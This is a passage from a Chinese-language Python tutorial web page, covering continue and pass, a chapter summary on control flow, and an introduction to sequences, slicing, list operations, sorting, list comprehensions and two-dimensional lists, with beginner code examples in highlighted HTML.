src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171018017.png" alt="image-20251024144447164"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171019219.png" alt="image-20251024144450435"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171021214.png" alt="image-20251024144531346"></p><h4 id="2-遍-历-循-环-语-法-结-构"><a href="#2-遍-历-循-环-语-法-结-构" class="headerlink" title="2 . 遍 历 循 环 语 法 结 构"></a>2 . 遍 历 循 环 语 法 结 构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171024128.png" alt="image-20251024144545975"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例4-21continue在for循环中的使用</span><br><span class="hljs-attribute">s</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">101</span>):<br>    <span class="hljs-attribute">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>: #奇数<br>        <span class="hljs-attribute">i</span>+=<span class="hljs-number">1</span><br>        <span class="hljs-attribute">continue</span> # 不再执行后面的代码了<br>    <span class="hljs-comment"># 累加求和的代码</span><br>    <span class="hljs-attribute">s</span>+=i<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">1</span>-<span class="hljs-number">100</span>之间的偶数和：&#x27;,s)<br><br></code></pre></td></tr></table></figure><h2 id="5-空语句pass"><a href="#5-空语句pass" class="headerlink" title="5.空语句pass"></a>5.空语句pass</h2><p>pass是Python中的保留字 </p><p>在语法结构中只起到占位符的作用，使语法结构完整，不报错 </p><p>一般可用在if、for、while、函数的定义、类的定义中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例4-22空语句pass</span><br><span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><h2 id="6-本章总结"><a href="#6-本章总结" class="headerlink" title="6.本章总结"></a>6.本章总结</h2><ul><li>程序的描述方式有三种：自然语言、流程图和伪代码 (代码） </li><li>程序的组织结构有三种：顺序结构、选择结构（分支结构）、循环结构 </li><li>选择结构分单分支结构(if)、双分支结构(if….else…)和多分支结构(if…elif…else…） </li><li>Python3.11新特征模式匹配match…case…结构 </li><li>循环结构有两种：遍历循环for和无限循环while </li><li>if结构可以互相嵌套，循环结构也可以互相嵌套，建议最多不超过三层 </li><li>break和continue只能用在循环结构中，break用于退出整个循环结构，continue用于结束本次循环 而进入下一次循环。 </li><li>空语句pass起到占位符的作用，使用语法结构完整、不报错</li></ul><h1 id="第五章-数据组合类型"><a href="#第五章-数据组合类型" class="headerlink" title="第五章 数据组合类型"></a>第五章 数据组合类型</h1><h2 id="1-本章目标-2"><a href="#1-本章目标-2" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>了解序列和索引的相关概念 </li><li>掌握序列的相关操作 </li><li>掌握列表的相关操作 </li><li>掌握元组的相关操作 </li><li>掌握字典的相关操作 </li><li>掌握集合的相关操作</li></ul><h2 id="2-序列和索引"><a href="#2-序列和索引" class="headerlink" title="2.序列和索引"></a>2.序列和索引</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>序列是一个用于存储多个值的连续空间，每个值都对应一个整数的编号，称为索引、</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171031209.png" alt="image-20251024160219446"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-1使用索引检索字符串中的元素</span><br><span class="hljs-comment"># 正向递增索引</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&#x27;helloworld&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(s)):<br>    <span class="hljs-built_in">print</span>(i,s[i],<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;\t\t&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n--------------------------------------&#x27;</span>)<br><span class="hljs-comment"># 反向递减</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(-10,0):<br>    <span class="hljs-built_in">print</span>(i,s[i],<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;\t\t&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,s[9],s[-1])<br><br></code></pre></td></tr></table></figure><h3 id="2-切片的语法操作"><a href="#2-切片的语法操作" class="headerlink" title="2.切片的语法操作"></a>2.切片的语法操作</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171033023.png" alt="image-20251024160239009"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例5-2序列的切片操作</span><br><span class="hljs-attribute">s</span>=&#x27;HelloWorld&#x27;<br><span class="hljs-comment"># 切片操作</span><br><span class="hljs-attribute">s1</span>=s[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">2</span>] # 索引从<span class="hljs-number">0</span>开始，到<span class="hljs-number">5</span>结束（不包含<span class="hljs-number">5</span>），步长为<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(s1)<br><span class="hljs-comment"># 省略了开始位置，start默认从0开始</span><br><span class="hljs-attribute">print</span>(s[:<span class="hljs-number">5</span>:<span class="hljs-number">1</span>])<br><span class="hljs-comment"># 省略开始位置start，省略步长step，步长默认为1</span><br><span class="hljs-attribute">print</span>(s[:<span class="hljs-number">5</span>:])<br><span class="hljs-comment"># 省略结束位置</span><br><span class="hljs-attribute">print</span>(s[<span class="hljs-number">0</span>::<span class="hljs-number">1</span>]) # stop,默认到序列的最后一个元素（包含最后一个元素）<br><span class="hljs-attribute">print</span>(s[<span class="hljs-number">5</span>::])<br><span class="hljs-attribute">print</span>(s[<span class="hljs-number">5</span>:]) # <span class="hljs-number">12</span>行代码与<span class="hljs-number">13</span>行代码功能相同，省略了结束，省略了一个步长<br><span class="hljs-comment"># 更改一下步长，步长更改为2</span><br><span class="hljs-attribute">print</span>(s[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">2</span>])<br><span class="hljs-comment"># 省略开始位置，省略结束位置，只写步长</span><br><span class="hljs-attribute">print</span>(s[::<span class="hljs-number">2</span>]) # 分别获取<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>索引位置上的元素<br><span class="hljs-comment"># 步长为负数</span><br><span class="hljs-attribute">print</span>(s[::-<span class="hljs-number">1</span>]) # 可以使用哪句代码替换嗯<br><span class="hljs-attribute">print</span>(s[-<span class="hljs-number">1</span>:-<span class="hljs-number">11</span>:-<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><h3 id="3-序列的相加操作"><a href="#3-序列的相加操作" class="headerlink" title="3.序列的相加操作"></a>3.序列的相加操作</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171035017.png" alt="image-20251024160255292"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171037471.png" alt="image-20251024160313528"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171039165.png" alt="image-20251024160321478"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-3序列的相加相乘操作</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&#x27;Hello&#x27;</span><br><span class="hljs-attribute">s2</span>=<span class="hljs-string">&#x27;World&#x27;</span><br><span class="hljs-built_in">print</span>(s+s2) #产生一个新的字符串序列<br><span class="hljs-comment"># 序列的相乘操作</span><br><span class="hljs-built_in">print</span>(s<span class="hljs-number">*5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-number">*40</span>)<br><span class="hljs-comment"># 示例5-4序列的相关操作符和函数的使用</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&#x27;helloworld&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e在helloworld中存在吗？&#x27;</span>,(<span class="hljs-string">&#x27;e&#x27;</span> <span class="hljs-keyword">in</span> s)) # <span class="hljs-keyword">in</span>的使用<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;v在helloworld中存在吗？&#x27;</span>,(<span class="hljs-string">&#x27;v&#x27;</span> <span class="hljs-keyword">in</span> s))<br><span class="hljs-comment"># not in 的使用</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e在helloworld中不存在吗？&#x27;</span>,(<span class="hljs-string">&#x27;e&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s)) # <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> 的使用<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;v在helloworld中不存在吗？&#x27;</span>,(<span class="hljs-string">&#x27;v&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s))<br><span class="hljs-comment"># 内置函数的使用</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len():&#x27;</span>,len(s))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;max():&#x27;</span>,max(s))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;min():&#x27;</span>,min(s))<br><span class="hljs-comment"># 序列对象的方法，使用序列的名称，打点调用</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s.index():&#x27;</span>,s.index(<span class="hljs-string">&#x27;o&#x27;</span>)) # o在s中第一次出现的索引位置 4<br><span class="hljs-comment"># print(&#x27;s.index():&#x27;,s.index(&#x27;v&#x27;)) # ValueError: substring not found,报错的原</span><br>因是v在字符串中根本不存在，不存在所以找不到<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s.count():&#x27;</span>,s.count(<span class="hljs-string">&#x27;o&#x27;</span>)) # 统计o在字符串s中出现的次数<br></code></pre></td></tr></table></figure><h2 id="3-列表类型"><a href="#3-列表类型" class="headerlink" title="3.列表类型"></a>3.列表类型</h2><h3 id="1-列表定义"><a href="#1-列表定义" class="headerlink" title="1.列表定义"></a>1.列表定义</h3><p>是指一系列的按特定顺序排列的元素组成。</p><p>是Python中内置的可变序列 </p><p>在Python中使用[]定义列表，元素与元素之间使用英文的逗号分隔 </p><p>列表中的元素可以是任意的数据类型</p><h3 id="2-列表的创建方式有两种"><a href="#2-列表的创建方式有两种" class="headerlink" title="2.列表的创建方式有两种"></a>2.列表的创建方式有两种</h3><h4 id="1-使用-直接创建列表"><a href="#1-使用-直接创建列表" class="headerlink" title="(1)使用[]直接创建列表"></a>(1)使用[]直接创建列表</h4><p>语法结构如下： </p><p>列表名&#x3D;[element1,element2,……elementN]</p><h4 id="2-使用内置函数list-创建列表"><a href="#2-使用内置函数list-创建列表" class="headerlink" title="(2)使用内置函数list()创建列表"></a>(2)使用内置函数list()创建列表</h4><p>语法结构如下： </p><p>列表名&#x3D;list(序列)</p><h3 id="3-列表的删除"><a href="#3-列表的删除" class="headerlink" title="3.列表的删除"></a>3.列表的删除</h3><p>语法结构如下： </p><p>del 列表名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-5列表的创建与删除</span><br><span class="hljs-comment"># 使用[]直接创建列表</span><br>lst = [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>, 98, 100, 5]<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-comment"># 可以使用内置的函数list()创建列表</span><br>lst2 = list(<span class="hljs-string">&#x27;helloworld&#x27;</span>)<br>lst3 = list(range(1, 10, 2))  # 从1开始，到10结束，步长为2，不包含10<br><span class="hljs-built_in">print</span>(lst2)<br><span class="hljs-built_in">print</span>(lst3)<br><span class="hljs-comment"># 列表是序列中的一种，对序列的操作符，运算符，函数均可以使用</span><br><span class="hljs-built_in">print</span>(lst +lst2 +lst3)  # 序列中的相加操作<br><span class="hljs-built_in">print</span>(lst * 3)  # 序列的相乘操作<br><span class="hljs-built_in">print</span>(len(lst))<br><span class="hljs-built_in">print</span>(max(lst3))<br><span class="hljs-built_in">print</span>(min(lst3))<br><span class="hljs-built_in">print</span>(lst2.count(<span class="hljs-string">&#x27;o&#x27;</span>))  # 统计o的个数<br><span class="hljs-built_in">print</span>(lst2.index(<span class="hljs-string">&#x27;o&#x27;</span>))  # o在列表lst2中第一次出现的位置<br><span class="hljs-comment"># 序列的删除操作</span><br>lst4=[10,20,30]<br><span class="hljs-built_in">print</span>(lst4)<br><span class="hljs-comment">#　删除列表</span><br>del lst4<br><span class="hljs-comment">#print(lst4) # NameError: name &#x27;lst4&#x27; is not defined. Did you mean: &#x27;lst&#x27;?</span><br><br></code></pre></td></tr></table></figure><h3 id="4-enumerate函数的使用语法结构"><a href="#4-enumerate函数的使用语法结构" class="headerlink" title="4.enumerate函数的使用语法结构"></a>4.enumerate函数的使用语法结构</h3><p>for index，item in enumerate(lst): </p><p>输出index和item</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-6列表的遍历操作</span><br>lst = [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>]<br><span class="hljs-comment"># 使用遍历循环for遍历列表元素</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-built_in">print</span>(item)<br><span class="hljs-comment"># 使用for循环，range()函数,len函数，根据索引进行遍历</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(lst)):<br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;--&gt;&#x27;</span>, lst[i])<br><span class="hljs-comment"># 第三种遍历方式 enumerate()函数</span><br><span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> enumerate(lst):<br>    <span class="hljs-built_in">print</span>(index, item)  # index是序号，不是索引<br><span class="hljs-comment"># 手动修改序号的起始值</span><br><span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> enumerate(lst, <span class="hljs-attribute">start</span>=1):<br>    <span class="hljs-built_in">print</span>(index, item)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------------&#x27;</span>)<br><span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> enumerate(lst, 1):<br>    <span class="hljs-built_in">print</span>(index, item)<br></code></pre></td></tr></table></figure><h3 id="5-列表的相关操作方法"><a href="#5-列表的相关操作方法" class="headerlink" title="5.列表的相关操作方法"></a>5.列表的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171046283.png" alt="image-20251024160602016"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-7列表的相关操作</span><br>lst = [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-string">&#x27;python&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>,lst,id(lst))<br><span class="hljs-comment"># 增加元素的操作</span><br>lst.append(<span class="hljs-string">&#x27;sql&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;增加元素之后：&#x27;</span>,lst,id(lst))<br><span class="hljs-comment"># 使用insert（index,x）在指定的index位置上插入元素x</span><br>lst.insert(1,100)<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-comment"># 列表元素的删除操作</span><br>lst.<span class="hljs-built_in">remove</span>(<span class="hljs-string">&#x27;world&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;删除元素之后的列表：&#x27;</span>,lst,id(lst))<br><span class="hljs-comment"># 使用pop（index）根据索引将元素取出，然后再删除</span><br><span class="hljs-built_in">print</span>(lst.pop(1))<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-comment"># 清除列表中所有的元素clear（）</span><br><span class="hljs-comment"># lst.clear()</span><br><span class="hljs-comment"># print(lst,id(lst))</span><br><span class="hljs-comment"># 列表的反向</span><br>lst.reverse() # 不会产生新的列表，在原列表的基础上进行的<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-comment"># 列表的拷贝，将产生一个新的列表对象</span><br><span class="hljs-attribute">new_lst</span>=lst.copy()<br><span class="hljs-built_in">print</span>(lst,id(lst))<br><span class="hljs-built_in">print</span>(new_lst,id(new_lst))<br><span class="hljs-comment"># 列表元素的修改操作</span><br><span class="hljs-comment"># 根据索引进行修改元素</span><br>lst[1]=<span class="hljs-string">&#x27;mysql&#x27;</span><br><span class="hljs-built_in">print</span>(lst)<br><br></code></pre></td></tr></table></figure><h3 id="6-列表排序的两种方式"><a href="#6-列表排序的两种方式" class="headerlink" title="6.列表排序的两种方式"></a>6.列表排序的两种方式</h3><h4 id="1-列表对象的sort方法"><a href="#1-列表对象的sort方法" class="headerlink" title="1.列表对象的sort方法"></a>1.列表对象的sort方法</h4><p>lst.sort(key&#x3D;None,reverse&#x3D;False)</p><p> key——&gt;表示排序的规则 </p><p>reverse——&gt;表示排序方式（默认升序）</p><h4 id="2-内置函数sorted"><a href="#2-内置函数sorted" class="headerlink" title="2.内置函数sorted()"></a>2.内置函数sorted()</h4><p>sorted(iterable,key&#x3D;None,reverse&#x3D;False)</p><p> iterable——&gt;表示的是排序的对象</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-8列表的排序操作</span><br>lst=[4,56,3,78,40,56,89]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>,lst)<br><span class="hljs-comment"># 排序，默认是升序</span><br>lst.sort() # 排序是在原列表的基础上进行的，不会产生新的列表对象<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;升序：&#x27;</span>,lst)<br><span class="hljs-comment"># 排序，降序</span><br>lst.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;降序：&#x27;</span>,lst)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br>lst2=[<span class="hljs-string">&#x27;banana&#x27;</span>,<span class="hljs-string">&#x27;apple&#x27;</span>,<span class="hljs-string">&#x27;Cat&#x27;</span>,<span class="hljs-string">&#x27;Orange&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>,lst2)<br><span class="hljs-comment"># 升序排序，先排大写，再排小写</span><br>lst2.sort()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;升序：&#x27;</span>,lst2)<br><span class="hljs-comment"># 降序排序，先排小写，后排大写</span><br>lst2.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;降序：&#x27;</span>,lst2)<br><span class="hljs-comment"># 忽略大小写进行比较</span><br>lst2.sort(<span class="hljs-attribute">key</span>=str.lower)<br><span class="hljs-built_in">print</span>(lst2)<br><span class="hljs-comment"># 示例5-9列表的排序sorted</span><br>lst = [4, 56, 3, 78, 40, 56, 89]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>, lst)<br><span class="hljs-comment"># 排序</span><br>asc_lst = sorted(lst)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;升序：&#x27;</span>, asc_lst)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>, lst)<br><span class="hljs-comment"># 降序</span><br>desc_sorted = sorted(lst, <span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;降序：&#x27;</span>, desc_sorted)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>, lst)<br>lst2 = [<span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;Cat&#x27;</span>, <span class="hljs-string">&#x27;Orange&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>, lst2)<br><span class="hljs-comment"># 忽略大小写进行排序</span><br>new_lst2 = sorted(lst2, <span class="hljs-attribute">key</span>=str.lower)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;原列表：&#x27;</span>, lst2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;排序后的列表：&#x27;</span>, new_lst2)<br><br></code></pre></td></tr></table></figure><h3 id="7-列表生成式的语法结构"><a href="#7-列表生成式的语法结构" class="headerlink" title="7.列表生成式的语法结构"></a>7.列表生成式的语法结构</h3><p>lst&#x3D;[expression for item in range] </p><p>lst&#x3D;[expression for item in range if condition]</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># 示例<span class="hljs-number">5</span>-<span class="hljs-number">10</span>列表生成式的使用<br>import <span class="hljs-built_in">random</span><br>lst = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br><span class="hljs-built_in">print</span>(lst)<br>lst = [item * item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br><span class="hljs-built_in">print</span>(lst)<br>lst = [<span class="hljs-built_in">random</span>.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>) <span class="hljs-keyword">for</span> <span class="hljs-symbol">_</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br><span class="hljs-built_in">print</span>(lst)<br># 从列表中选择符合条件的元素组成新的列表<br>lst = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> i <span class="hljs-symbol">%</span> <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(lst)<br><br></code></pre></td></tr></table></figure><h3 id="8-二维列表"><a href="#8-二维列表" class="headerlink" title="8.二维列表"></a>8.二维列表</h3><h4 id="1-二维列表：表格数据"><a href="#1-二维列表：表格数据" class="headerlink" title="1.二维列表：表格数据"></a>1.二维列表：表格数据</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171052863.png" alt="image-20251024160745487"></p><h4 id="2-二维列表的遍历"><a href="#2-二维列表的遍历" class="headerlink" title="2.二维列表的遍历"></a>2.二维列表的遍历</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171054481.png" alt="image-20251024160758420"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例5-11二维列表的遍历与列表生成式</span><br><span class="hljs-comment"># 创建二维列表</span><br>lst=[<br>   [<span class="hljs-string">&#x27;城市&#x27;</span>,<span class="hljs-string">&#x27;环比&#x27;</span>,<span class="hljs-string">&#x27;同比&#x27;</span>],<br>   [<span class="hljs-string">&#x27;北京&#x27;</span>,102,103],<br>   [<span class="hljs-string">&#x27;上海&#x27;</span>,104,504],<br>   [<span class="hljs-string">&#x27;深圳&#x27;</span>,100,39]<br>]<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-comment"># 遍历二维列表使用双层for循环</span><br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> lst: # 行<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row: # 列<br>        <span class="hljs-built_in">print</span>(item,<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;\t\t&#x27;</span>)<br>    <span class="hljs-built_in">print</span>() # 换行<br><span class="hljs-comment"># 